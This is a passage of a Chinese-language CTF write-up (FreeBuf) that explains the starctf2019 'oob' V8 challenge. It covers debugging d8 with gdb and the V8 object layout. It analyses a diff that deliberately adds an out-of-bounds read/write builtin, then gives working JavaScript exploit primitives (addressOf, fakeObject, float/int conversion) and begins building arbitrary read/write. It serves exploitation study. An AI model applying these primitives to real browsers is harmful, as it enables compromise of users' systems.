@@ -1,0 +1,1778 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ ***本文原创作者：walkerfuz，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
+
+## 0x00 写在前面
+
+**第一次接触浏览器的漏洞利用，这篇文章主要是从入门角度，一步步复现今年starctf2019中的浏览器漏洞题目—oob。期间遇到很多坑，也解决了一些问题，比如在实现任意地址读写后如何稳定获取libc基址的小技巧。希望这篇文章能够给新入门的童鞋一点参考，共同进步。**
+
+首先个人感觉，学习浏览器漏洞利用的前提条件，一是能够对传统的栈溢出和堆漏洞的利用方式有基本的认识，比如知道堆的常规利用方式：利用堆漏洞泄露libc基址，然后修改free_hook/malloc_hook为system地址实现命令执行；二是熟悉基本JavaScript对象和函数的使用。建议新入门的童鞋可以先花时间看看ctf.wiki，打牢基础，这样对后续学习漏洞利用会很有帮助。
+
+## 0x01 v8调试的相关基础
+
+v8是chrome浏览器的JavaScript解析引擎，针对chrome浏览器的漏洞利用也几乎都是v8引擎引起的。因此学习v8引擎的调试十分重要。在调试之前需要先学会编译v8引擎，网上有很多帖子，这里就不在赘述了。编译的过程遇到的坑，也只有自己才能体会。首先要知道的是，v8编译后二进制名称叫d8而不是v8。下面讲解一下基本的调试技巧。以下主要是在Ubuntu18.04平台中调试。
+
+### 1\. allow-natives-syntax选项
+
+v8的这个选项，主要是定义了一些v8运行时支持函数，以便于本地调试：
+
+    
+    
+    browser/x64.release$ ./d8 --allow-natives-syntax  
+    V8 version 7.5.0 (candidate)  
+    d8> var a = [1, 2, 3];  
+    undefined  
+    d8> %DebugPrint(a);  
+    0x2ebcfb54dd41 <JSArray[3]>  
+    [1, 2, 3]  
+    d8> %SystemBreak();  
+    Trace/breakpoint trap (core dumped)
+
+在加载d8时加入这个选项就可以在js中调用一些有助于调试的本地运行时函数：
+
+> %DebugPrint(obj) 输出对象地址
+>
+> %SystemBreak() 触发调试中断主要结合gdb等调试器使用
+
+另外d8还提供了一系列调试支持，具体可以查看d8 --help来使用，目前入门阶段只需要学习这两个函数。
+
+v8的官方团队还编写了一个gdb的gdbinit脚本，使得在gdb中就能可视化显示v8的对象结构。将该脚本下载重命名为gdbinit_v8，然后添加至/.gdbinit脚本：
+
+    
+    
+    source /path/to/gdbinit_v8
+
+下面将--allow-natives-syntax选项和gdbinit结合使用，编写test.js如下：
+
+    
+    
+    var a = [1,2,3];  
+    var b = [1.1, 2.2, 3.3];  
+    var c = [a, b];  
+    %DebugPrint(a);  
+    %SystemBreak();  //触发第一次调试  
+    %DebugPrint(b);  
+    %SystemBreak();  //触发第二次调试  
+    %DebugPrint(c);  
+    %SystemBreak();  //触发第三次调试
+
+gdb运行d8：
+
+    
+    
+    root@kali:~/ctf/browser/x64.release$ gdb ./d8  
+    pwndbg> set args --allow-natives-syntax ./test.js  
+    pwndbg> r  
+    Starting program: x64.release/d8 --allow-natives-syntax ./test.js  
+    [Thread debugging using libthread_db enabled]  
+    [New Thread 0x7ff87fde9700 (LWP 18393)]  
+    [New Thread 0x7ff87f5e8700 (LWP 18394)]  
+    [New Thread 0x7ff87ede7700 (LWP 18395)]  
+    0x12e891f8df11 <JSArray[3]>                     <-- 这里打印出了数组对象a的内存地址
+
+可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断：
+
+    
+    
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
+    ───────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────  
+     RCX  0x55646b212ac0 (Builtins_CallRuntimeHandler) ◂— push   rbp  
+     RDX  0x55646b834e00 —▸ 0x7fffe55e9990 ◂— 0x55646b834e00  
+     RDI  0x0  
+     RSI  0x7fffe55e9208 —▸ 0x3796115c04d1 ◂— 0x3796115c05  
+     R8   0x2ff2a3481869 ◂— 0x3796115c0f  
+     R9   0x9c  
+     R10  0xa  
+     R11  0xfffffffffffffffb  
+     R12  0x55646b8bc280 ◂— 0x0  
+     R13  0x55646b834e80 —▸ 0x3796115c0751 ◂— 0x7a00003796115c07  
+     R14  0x0  
+     R15  0x55646b8ba608 ◂— 0x1baddead0baddeaf  
+     RBP  0x7fffe55e9190 —▸ 0x7fffe55e91b8 —▸ 0x7fffe55e91d8 —▸ 0x7fffe55e9230 —▸ 0x7fffe55e9258 ◂— ...  
+     RSP  0x7fffe55e9168 —▸ 0x55646aefc3b5 ◂— mov    r14, qword ptr [rbx + 0x58]  
+     RIP  0x55646b28ef71 (v8::base::OS::DebugBreak()+1) ◂— ret      
+    ─────────────────────────────────────────────────────────────────[ DISASM ]───────────────────  
+     ► 0x55646b28ef71 <v8::base::OS::DebugBreak()+1>    ret    <0x55646aefc3b5>  
+        ↓  
+       0x55646aefc3b5                                   mov    r14, qword ptr [rbx + 0x58]  
+       0x55646aefc3b9                                   mov    rsi, qword ptr [rbx + 0x9da8]  
+       0x55646aefc3c0                                   mov    qword ptr [rbx + 0x9da8], r15  
+       0x55646aefc3c7                                   add    dword ptr [rbx + 0x9db8], -1  
+       0x55646aefc3ce                                   cmp    qword ptr [rbx + 0x9db0], r12  
+       0x55646aefc3d5                                   je     0x55646aefc3f0  
+    ......  
+      ► f 0     55646b28ef71 v8::base::OS::DebugBreak()+1  
+       f 1     55646aefc3b5  
+       f 2     55646b1bf554 Builtins_CEntry_Return1_DontSaveFPRegs_ArgvInRegister_NoBuiltinExit+52  
+       f 3     55646b212b12 Builtins_CallRuntimeHandler+82  
+       f 4     55646b132766 Builtins_InterpreterEntryTrampoline+678  
+       f 5       2500000000  
+       f 6     2ff2a349f3b9  
+       f 7     12e891f8df99  
+       f 8     12e891f8df11  
+       f 9     3796115c04d1  
+       f 10       9c00000000  
+      pwndbg>
+
+此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构了。这里我们主要使用job命令，这个命令可以可视化显示JavaScript对象的内存结构：
+
+    
+    
+    pwndbg> job 0x12e891f8df11  
+    0x12e891f8df11: [JSArray]  
+     - map: 0x08721d4c2d99 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]  
+     - prototype: 0x2ff2a3491111 <JSArray[0]>  
+     - elements: 0x12e891f8de31 <FixedArray[3]> [PACKED_SMI_ELEMENTS (COW)]  
+     - length: 3  
+     - properties: 0x3796115c0c71 <FixedArray[0]> {  
+        #length: 0x1701198001a9 <AccessorInfo> (const accessor descriptor)  
+     }  
+     - elements: 0x12e891f8de31 <FixedArray[3]> {  
+               0: 1  
+               1: 2  
+               2: 3  
+     }
+
+这里需要注意的是，v8在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。因此上述对象a的实际内存地址应该是0x12e891f8df10。
+
+我们用telescope命令查看一下内存数据：
+
+    
+    
+    pwndbg> telescope 0x244de278df10  
+    00:0000│   0x244de278df10 —▸ 0xbc01102d99 ◂— 0x400002a234ca001  
+    01:0008│   0x244de278df18 —▸ 0x2a234ca00c71 ◂— 0x2a234ca008  
+    02:0010│   0x244de278df20 —▸ 0x244de278de31 ◂— 0x2a234ca008  
+    03:0018│   0x244de278df28 ◂— 0x300000000  
+    04:0020│   0x244de278df30 —▸ 0x2a234ca014f9 ◂— 0x2a234ca001  
+    05:0028│   0x244de278df38 ◂— 0x300000000  
+    06:0030│   0x244de278df40 ◂— 0x3ff199999999999a  
+    07:0038│   0x244de278df48 ◂— 0x400199999999999a
+
+在gdb中使用c命令继续运行：
+
+    
+    
+    pwndbg> c  
+    Continuing.  
+    0x244de278df59 <JSArray[3]>  
+    ....  
+    pwndbg>
+
+发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址：
+
+    
+    
+    pwndbg> job 0x244de278df59  
+    0x244de278df59: [JSArray]  
+     - map: 0x00bc01102ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]  
+     - prototype: 0x0b61bda11111 <JSArray[0]>  
+     - elements: 0x244de278df31 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]  
+     - length: 3  
+     - properties: 0x2a234ca00c71 <FixedArray[0]> {  
+        #length: 0x141d086c01a9 <AccessorInfo> (const accessor descriptor)  
+     }  
+     - elements: 0x244de278df31 <FixedDoubleArray[3]> {  
+               0: 1.1  
+               1: 2.2  
+               2: 3.3  
+     }
+
+根据上面的经验，很容易知道对象b的实际内存地址为0x244de278df58。
+
+### 2\. v8的对象结构
+
+和vb等语言的解析类似，JavaScript是一种解释执行语言，v8本质上是一个JavaScript的解释执行程序。
+
+首先，需要了解v8解析执行JavaScript语句的基本流程：v8在读取js语句后，首先将这一条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。
+
+为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阀值后，就会将这段语法树直接转换为机器码。后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为ByteCode字节码，这样就大大加快了执行速度。这就是著名的JIT优化。
+
+这样的性能优化，虽然加快了程序的执行，但也带了很多安全问题。如果v8本来通过JIT引擎为某段语法树比如a+b加法计算生成了一段机器码`add
+eax,ebx`，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出来这个改变，这就造成了a和b对象在加法运算时的类型混淆。JIT的漏洞利用后续会专门总结。
+
+熟悉了v8的解析过程，我们再来看一下v8中的对象结构。以上面的数组对象b为例，通过job命令可以看到一个对象在内存中布局大致如下所示：
+
+map | 表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型  
+---|---  
+prototype | prototype  
+elements | 对象元素  
+length | 元素个数  
+properties | 属性  
+  
+细心的童鞋可以发现，数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处：
+
+    
+    
+    pwndbg> job 0x244de278df31  
+    0x244de278df31: [FixedDoubleArray]  
+     - map: 0x2a234ca014f9 <Map>  
+     - length: 3  
+               0: 1.1  
+               1: 2.2  
+               2: 3.3  
+    pwndbg> telescope 0x244de278df30  
+    00:0000│   0x244de278df30 —▸ 0x2a234ca014f9 ◂— 0x2a234ca001  
+    01:0008│   0x244de278df38 ◂— 0x300000000  
+    02:0010│   0x244de278df40 ◂— 0x3ff199999999999a  
+    03:0018│   0x244de278df48 ◂— 0x400199999999999a  
+    04:0020│   0x244de278df50 ◂— 0x400a666666666666 ('ffffff\n@')
+
+也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如下图所示：
+
+    
+    
+       elements  ----> +------------------------+  
+                       |          MAP           +<---------+  
+                       +------------------------+          |  
+                       |      element 1         |          |  
+                       +------------------------+          |  
+                       |      element 2         |          |  
+                       |      ......            |          |  
+                       |      element n         |          |  
+     ArrayObject  ---->-------------------------+          |  
+                       |      map               |          |  
+                       +------------------------+          |  
+                       |      prototype         |          |  
+                       +------------------------+          |  
+                       |      elements          |          |  
+                       |                        +----------+  
+                       +------------------------+  
+                       |      length            |  
+                       +------------------------+  
+                       |      properties        |  
+                       +------------------------+
+
+由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。
+
+注意，上述内存布局是FloatArray的内存布局，其它类型的Array与其类似，但不完全相同。
+
+### 3\. 浏览器v8的解题步骤
+
+一般浏览器的出题有两种，一种是diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。一般在大型比赛中会直接采用第二种方式，更考验选手的实战能力。
+
+出题者通常会提供一个diff文件，或直接给出一个编译过diff补丁后的浏览器程序。如果只给了一个diff文件，就需要我们自己去下载相关的commit源码，然后本地打上diff补丁，编译出浏览器程序，再进行本地调试。
+
+比如starctf中的oob题目给出了一个diff文件：
+
+    
+    
+    diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc  
+    index b027d36..ef1002f 100644  
+    --- a/src/bootstrapper.cc  
+    +++ b/src/bootstrapper.cc  
+    ... ...
+
+下载v8然后利用下面的命令，将diff文件加入到v8中源代码分支中：
+
+    
+    
+    git apply < oob.diff
+
+最后编译出增加了diff补丁的v8程序调试即可。
+
+## 0x02 分析diff文件
+
+提供diff文件的浏览器漏洞利用题目，第一步就是要认真查看diff文件，确定出题者增加的漏洞具体信息。观察oob.diff补丁文件可以发现，出题者主要增加了三部分内容。
+
+首先，为Array对象增加了一个oob函数，内部表示为kArrayOob：
+
+    
+    
+    --- a/src/bootstrapper.cc  
+    +++ b/src/bootstrapper.cc  
+    @@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,  
+                               Builtins::kArrayPrototypeCopyWithin, 2, false);  
+         SimpleInstallFunction(isolate_, proto, "fill",  
+                               Builtins::kArrayPrototypeFill, 1, false);  
+    +    SimpleInstallFunction(isolate_, proto, "oob",  
+    +                          Builtins::kArrayOob,2,false);  //增加了一个oob成员函数  
+         SimpleInstallFunction(isolate_, proto, "find",  
+                               Builtins::kArrayPrototypeFind, 1, false);  
+         SimpleInstallFunction(isolate_, proto, "findIndex",
+
+然后，增加了kArrayOob函数的具体实现：
+
+    
+    
+    --- a/src/builtins/builtins-array.cc  
+    +++ b/src/builtins/builtins-array.cc  
+    @@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,  
+       return *final_length;  
+     }  
+     }  // namespace  
+    +BUILTIN(ArrayOob){  
+    +    uint32_t len = args.length();  
+    +    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();  
+    +    Handle<JSReceiver> receiver;  
+    +    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(  
+    +            isolate, receiver, Object::ToObject(isolate, args.receiver()));  
+    +    Handle<JSArray> array = Handle<JSArray>::cast(receiver);  
+    +    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());  
+    +    uint32_t length = static_cast<uint32_t>(array->length()->Number());  
+    +    if(len == 1){  
+    +        //read  
+    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length))); //off by one越界读取  
+    +    }else{  
+    +        //write  
+    +        Handle<Object> value;  
+    +        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(  
+    +                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));  
+    +        elements.set(length,value->Number());//off by one越界写  
+    +        return ReadOnlyRoots(isolate).undefined_value();  
+    +    }  
+    +}
+
+最后，为kArrayOob类型做了与实现函数的关联：
+
+    
+    
+    --- a/src/builtins/builtins-definitions.h  
+    +++ b/src/builtins/builtins-definitions.h  
+    @@ -368,6 +368,7 @@ namespace internal {  
+       TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \  
+       /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \  
+       TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \  
+    +  CPP(ArrayOob)                                                                \  
+                                                                                    \  
+       /* ArrayBuffer */                                                            \  
+       /* ES #sec-arraybuffer-constructor */                                        \  
+    diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc  
+    index ed1e4a5..c199e3a 100644  
+    --- a/src/compiler/typer.cc  
+    +++ b/src/compiler/typer.cc  
+    @@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {  
+           return Type::Receiver();  
+         case Builtins::kArrayUnshift:  
+           return t->cache_->kPositiveSafeInteger;  
+    +    case Builtins::kArrayOob:  
+    +      return Type::Receiver();  
+    ​  
+         // ArrayBuffer functions.  
+         case Builtins::kArrayBufferIsView:
+
+从上面看diff的增加的主要逻辑在第二部分。
+
+大致意思就是：获取oob函数的参数，当参数个数为1时，读取数组第length个元素的内容，否则将第length个元素改写为args输入参数中的第二个参数，注意上述参数个数是C++中的参数长度。
+
+我们都知道C++中成员函数的第一个参数必定是this指针，因此上述逻辑转换为JavaScript中的对应逻辑就是，当oob函数的参数为空时，返回数组对象第length个元素内容；当oob函数参数个数不为0时，就将第一个参数写入到数组中的第length个元素位置。
+
+我们可以在v8中尝试调用该函数：
+
+    
+    
+    browser/x64.release$ ./d8  
+    V8 version 7.5.0 (candidate)  
+    d8> var a = [1, 2, 3,4];  
+    undefined  
+    d8> a.oob();  
+    2.09461420962815e-310  
+    d8> a.oob(1);  
+    undefined
+
+可以看到当oob函数为空时打印了一个数值，但这个数值是什么，目前还不清楚。
+
+理解了diff的内容后，就要仔细分析漏洞点了。假设定义一个数组对象长度为length，那么访问数组元素的下标就应该是0到length-1，但diff中增加的oob函数却可以读取和改写第length个元素。很显然，这里存在一个针对数组对象的off
+by one越界读写漏洞。
+
+我们利用gdb结合d8调试一下。编写test.js如下
+
+    
+    
+    var a = [1,2,3, 1.1];  
+    %DebugPrint(a);  
+    %SystemBreak();  
+    var data = a.oob();  
+    console.log("[*] oob return data:" + data.toString());  
+    %SystemBreak();  
+    a.oob(2);  
+    %SystemBreak();
+
+gdb加载v8：
+
+    
+    
+    root@kali:~/ctf/browser/x64.release$ gdb ./d8  
+    pwndbg> set args --allow-natives-syntax ./test.js  
+    pwndbg> r  
+    0x15022c0cde49 <JSArray[4]>
+
+可以看出，第一次SystemBreak触发断点时，v8打印了数组对象a的内存地址。此时，利用job和telescope命令查看对象和elements的内存布局，如下所示：
+
+    
+    
+    pwndbg> job 0x15022c0cde49  
+    0x15022c0cde49: [JSArray]  
+     - map: 0x2620a5202ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]  
+     - prototype: 0x32bcaa8d1111 <JSArray[0]>  
+     - elements: 0x15022c0cde19 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]  
+     - length: 4  
+     - properties: 0x27e8bae80c71 <FixedArray[0]> {  
+        #length: 0x13483f7401a9 <AccessorInfo> (const accessor descriptor)  
+     }  
+     - elements: 0x15022c0cde19 <FixedDoubleArray[4]> {  
+               0: 1  
+               1: 2  
+               2: 3  
+               3: 1.1  
+     }  
+    pwndbg> telescope 0x15022c0cde48  
+    00:0000│   0x15022c0cde48 —▸ 0x2620a5202ed9 ◂— 0x4000027e8bae801  
+    01:0008│   0x15022c0cde50 —▸ 0x27e8bae80c71 ◂— 0x27e8bae808  
+    02:0010│   0x15022c0cde58 —▸ 0x15022c0cde19 ◂— 0x27e8bae814  
+    03:0018│   0x15022c0cde60 ◂— 0x400000000  
+    04:0020│   0x15022c0cde68 ◂— 0x0  
+    ... ↓  
+    pwndbg> job 0x15022c0cde19  <-- 数组对象的elements结构  
+    0x15022c0cde19: [FixedDoubleArray]  
+     - map: 0x27e8bae814f9 <Map>  
+     - length: 4  
+               0: 1  
+               1: 2  
+               2: 3  
+               3: 1.1  
+    pwndbg> telescope 0x15022c0cde18  
+    00:0000│   0x15022c0cde18 —▸ 0x27e8bae814f9 ◂— 0x27e8bae801  
+    01:0008│   0x15022c0cde20 ◂— 0x400000000  
+    02:0010│   0x15022c0cde28 ◂— 0x3ff0000000000000  
+    03:0018│   0x15022c0cde30 ◂— 0x4000000000000000  
+    04:0020│   0x15022c0cde38 ◂— 0x4008000000000000  
+    05:0028│   0x15022c0cde40 ◂— 0x3ff199999999999a  
+    06:0030│   0x15022c0cde48 —▸ 0x2620a5202ed9 ◂— 0x4000027e8bae801  
+    07:0038│   0x15022c0cde50 —▸ 0x27e8bae80c71 ◂— 0x27e8bae808
+
+第二次SystemBreak中断，获取了oob的返回值：
+
+    
+    
+    pwndbg> c  
+    Continuing.  
+    [*] oob return data:2.0712047654477e-310
+
+第三次触发SystemBreak中断后，重新查看查看对象a的elements布局：
+
+    
+    
+    pwndbg> telescope 0x15022c0cde48  
+    00:0000│   0x15022c0cde48 ◂— 0x4000000000000000  MAP类型  
+    01:0008│   0x15022c0cde50 —▸ 0x27e8bae80c71 ◂— 0x27e8bae808  
+    02:0010│   0x15022c0cde58 —▸ 0x15022c0cde19 ◂— 0x27e8bae814  
+    03:0018│   0x15022c0cde60 ◂— 0x400000000  
+    04:0020│   0x15022c0cde68 —▸ 0x27e8bae80561 ◂— 0x2000027e8bae801  
+    05:0028│   0x15022c0cde70 —▸ 0x2620a5202ed9 ◂— 0x4000027e8bae801  
+    06:0030│   0x15022c0cde78 —▸ 0x27e8bae81ea9 ◂— 0x4000027e8bae801  
+    07:0038│   0x15022c0cde80 ◂— 0x2800000003  
+    pwndbg> telescope 0x15022c0cde18  
+    00:0000│   0x15022c0cde18 —▸ 0x27e8bae814f9 ◂— 0x27e8bae801  
+    01:0008│   0x15022c0cde20 ◂— 0x400000000  
+    02:0010│   0x15022c0cde28 ◂— 0x3ff0000000000000  
+    03:0018│   0x15022c0cde30 ◂— 0x4000000000000000  
+    04:0020│   0x15022c0cde38 ◂— 0x4008000000000000  
+    05:0028│   0x15022c0cde40 ◂— 0x3ff199999999999a  
+    06:0030│   0x15022c0cde48 ◂— 0x4000000000000000  <-- 第length个元素内容被修改为了2浮点数表示  
+    07:0038│   0x15022c0cde50 —▸ 0x27e8bae80c71 ◂— 0x27e8bae808
+
+可以看到，oob函数将数组对象的第length个元素给改写了。如果对照数组对象被改写前后的变化，细心的童鞋会发现，改写的第length个元素内容，实际上是数组对象的MAP属性。MAP属性代表的是一个对象的类型，如果将上述浮点数转换为16进制打印，我们会发现oob读取的内容即为数组对象MAP属性。
+
+也就是说，diff增加的oob函数，可以实现读写数组对象MAP属性的漏洞效果。
+
+## 0x03 编写addressOf和fakeObject
+
+基于上述分析，如果我们利用oob的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。
+
+那出现类型混淆怎么利用呢？举个例子，如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。
+
+造成上面的原因在于，v8完全依赖Map类型对js对象进行解析。上面这个逻辑希望能仔细理解一下。
+
+通过上面两种类型混淆的方式，能够实现如下效果：
+
+>  **计算一个对象的地址addressOf**
+> ：将需要计算内存地址的对象存放到一个对象数组中的A[0]，然后利用上述类型混淆漏洞，将对象数组的Map类型修改为浮点数数组的类型，访问A[0]即可得到浮点数表示的目标对象的内存地址。
+>
+>  **将一个内存地址伪造为一个对象fakeObject**
+> ：将需要伪造的内存地址存放到一个浮点数数组中的B[0]，然后利用上述类型混淆漏洞，将浮点数数组的Map类型修改为对象数组的类型，那么B[0]此时就代表了以这个内存地址为起始地址的一个JS对象了。
+
+下面我们利用JavaScript实现上述addressOf和fakeObject功能原语。
+
+首先定义两个全局的Float数组和对象数组，利用oob函数漏洞泄露两个数组的Map类型：
+
+    
+    
+    var obj = {"a": 1};  
+    var obj_array = [obj];  
+    var float_array = [1.1];  
+    ​  
+    var obj_array_map = obj_array.oob();  
+    var float_array_map = float_array.oob();
+
+然后实现下面两个函数。
+
+ **addressOf 泄露某个对象的内存地址**
+
+    
+    
+     // 泄露某个object的地址  
+    function addressOf(obj_to_leak)  
+    {  
+        obj_array[0] = obj_to_leak;  
+        obj_array.oob(float_array_map);  
+        let obj_addr = f2i(obj_array[0]) - 1n;  
+        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用  
+        return obj_addr;  
+    }
+
+ **fakeObject 将指定内存强制转换为一个js对象**
+
+    
+    
+     // 将某个addr强制转换为object对象  
+    function fakeObject(addr_to_fake)  
+    {  
+        float_array[0] = i2f(addr_to_fake + 1n);  
+        float_array.oob(obj_array_map);  
+        let faked_obj = float_array[0];  
+        float_array.oob(float_array_map); // 还原array类型以便后续继续使用  
+        return faked_obj;  
+    }
+
+编写测试语句，打印一个对象的地址：
+
+    
+    
+    var test_obj = {};  
+    %DebugPrint(test_obj);  
+    var test_obj_addr = addressOf(test_obj);  
+    console.log("[*] leak object addr: 0x" + test_obj_addr.toString(16));  
+    %SystemBreak();
+
+上面%DebugPrint函数是为了本地调试时做参考用的。利用gdb加载d8，执行上述test.js脚本，会得到以下输出：
+
+    
+    
+    0x1d2cdad4f251 <Object map = 0x3bd05f9c0459>  
+    [*] leak object addr: 0x0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000074b36b53c94
+
+地址显示的并不正确，这是因为计算后得到的test_obj_addr是以浮点数存储的，而我们应该显示的是8字节16进制无符号整数，直接将浮点数转换为字符串肯定是不正确的。下面用js编写一个8字节浮点数转16进制无符号整数的代码。
+
+    
+    
+    var buf =new ArrayBuffer(16);  
+    var float64 = new Float64Array(buf);  
+    var bigUint64 = new BigUint64Array(buf);  
+    // 浮点数转换为64位无符号整数  
+    function f2i(f)  
+    {  
+        float64[0] = f;  
+        return bigUint64[0];  
+    }  
+    // 64位无符号整数转为浮点数  
+    function i2f(i)  
+    {  
+        bigUint64[0] = i;  
+        return float64[0];  
+    }  
+    // 64位无符号整数转为16进制字节串  
+    function hex(i)  
+    {  
+        return i.toString(16).padStart(16, "0");  
+    }
+
+将上面所有代码结合在一起存储为test.js：
+
+    
+    
+    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××  
+    var buf =new ArrayBuffer(16);  
+    var float64 = new Float64Array(buf);  
+    var bigUint64 = new BigUint64Array(buf);  
+    ​  
+    // 浮点数转换为64位无符号整数  
+    function f2i(f)  
+    {  
+        float64[0] = f;  
+        return bigUint64[0];  
+    }  
+    // 64位无符号整数转为浮点数  
+    function i2f(i)  
+    {  
+        bigUint64[0] = i;  
+        return float64[0];  
+    }  
+    // 64位无符号整数转为16进制字节串  
+    function hex(i)  
+    {  
+        return i.toString(16).padStart(16, "0");  
+    }  
+    ​  
+    // ××××××××2. addressOf和fakeObject的实现××××××××  
+    var obj = {"a": 1};  
+    var obj_array = [obj];  
+    var float_array = [1.1];  
+    ​  
+    var obj_array_map = obj_array.oob();  
+    var float_array_map = float_array.oob();  
+    ​  
+    // 泄露某个object的地址  
+    function addressOf(obj_to_leak)  
+    {  
+        obj_array[0] = obj_to_leak;  
+        obj_array.oob(float_array_map);  
+        return obj_array[0];  
+    }  
+    ​  
+    // 将某个addr强制转换为object对象  
+    function fakeObject(addr_to_fake)  
+    {  
+        float_array[0] = i2f(addr_to_fake + 1n);  
+        float_array.oob(obj_array_map);  
+        let faked_obj = float_array[0];  
+        float_array.oob(float_array_map); // 还原array类型以便后续继续使用  
+        return faked_obj;  
+    }  
+    ​  
+    var test_obj = {};  
+    %DebugPrint(test_obj);  
+    var test_obj_addr = f2i(addressOf(test_obj));  
+    console.log("[*] leak object addr: 0x" + hex(test_obj_addr));  
+    %SystemBreak();
+
+gdb调试d8，得到输出结果：
+
+    
+    
+    pwndbg> r  
+    0x08d6b764f031 <Object map = 0x11be70d00459>  
+    [*] leak object addr: 0x000008d6b764f031
+
+可以发现，我们正确泄露出了指定对象的地址。同样，我们也可以利用fakeObject将某个内存地址转换为一个object对象。
+
+## 0x04 如何实现任意地址读写：构造AAR/AAW原语
+
+在实现上述任意对象地址泄露addressOf和任意地址对象构造fakeObject的JS原语后，接下来怎么利用呢？这时候就要利用到fakeObject函数了。
+
+既然fakeObject可以将一个内存地址强制转换为一个js对象，结合上面对JS对象内存布局的理解，如下图所示：
+
+    
+    
+     ArrayObject  ---->-------------------------+            
+                       |      map               |            
+                       +------------------------+            
+                       |      prototype         |            
+                       +------------------------+            
+                       |      elements 指针      |            
+                       |                        +  
+                       +------------------------+  
+                       |      length            |  
+                       +------------------------+  
+                       |      properties        |  
+                       +------------------------+
+
+如果我们在一块内存上部署了上述虚假的内存属性，比如数组对象的map、prototype、elements指针、length、properties属性，我们就可以利用前面通过漏洞实现的fakeObject原语，强制将这块内存伪造为一个数组对象。
+
+恶意构造的这个数组对象的elements指针是可控的，而这个指针指向了存储数组元素内容的内存地址。如果我们将这个指针修改为我们想要访问的内存地址，那后续我们访问这个数组对象的内容，实际上访问的就是我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内存访问读写效果了。
+
+具体说明一下，假设我们定义一个float数组对象fake_array，我们可以利用addressOf泄露fake_array对象的地址，然后根据其elements对象与fake_object的内存偏移，可以得出elements地址=addresOf(fake_object)
+- 0x30的关系，从内存布局中我们也能得到这样的关系：
+
+    
+    
+    pwndbg> job 0x15022c0cde49  
+    0x15022c0cde49: [JSArray]  
+     - map: 0x2620a5202ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]  
+     - prototype: 0x32bcaa8d1111 <JSArray[0]>  
+     - elements: 0x15022c0cde19 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS] <-- elements指针  
+     - length: 4  
+     - properties: 0x27e8bae80c71 <FixedArray[0]> {  
+        #length: 0x13483f7401a9 <AccessorInfo> (const accessor descriptor)  
+     }  
+     - elements: 0x15022c0cde19 <FixedDoubleArray[4]> {  
+               0: 1  
+               1: 2  
+               2: 3  
+               3: 1.1  
+     }  
+    pwndbg> telescope 0x15022c0cde48  
+    00:0000│   0x15022c0cde48 —▸ 0x2620a5202ed9 ◂— 0x4000027e8bae801  
+    01:0008│   0x15022c0cde50 —▸ 0x27e8bae80c71 ◂— 0x27e8bae808  
+    02:0010│   0x15022c0cde58 —▸ 0x15022c0cde19 ◂— 0x27e8bae814  
+    03:0018│   0x15022c0cde60 ◂— 0x400000000  
+    04:0020│   0x15022c0cde68 ◂— 0x0  
+    ... ↓  
